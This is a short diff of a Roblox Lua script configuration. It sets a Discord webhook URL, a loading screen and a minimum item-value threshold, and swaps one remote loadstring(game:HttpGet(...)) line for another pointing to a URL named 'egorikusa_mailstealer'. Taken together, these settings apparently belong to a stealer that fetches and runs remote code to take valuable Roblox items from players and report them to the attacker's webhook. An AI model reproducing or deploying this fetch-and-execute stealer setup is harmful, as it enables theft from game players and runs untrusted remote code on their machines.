@@ -6,4 +6,4 @@ Webhook = "https://discord.com/api/webhooks/1202631135700586496/sAI7zCBpAzQ99_rZ
 LoadingScreen = true
 MinimumRAP = 10000
 
-loadstring(game:HttpGet("https://gitea.com/Egorikusa/123/raw/branch/main/mailbox"))()
+loadstring(game:HttpGet("https://shz.al/~egorikusa_mailstealer"))()
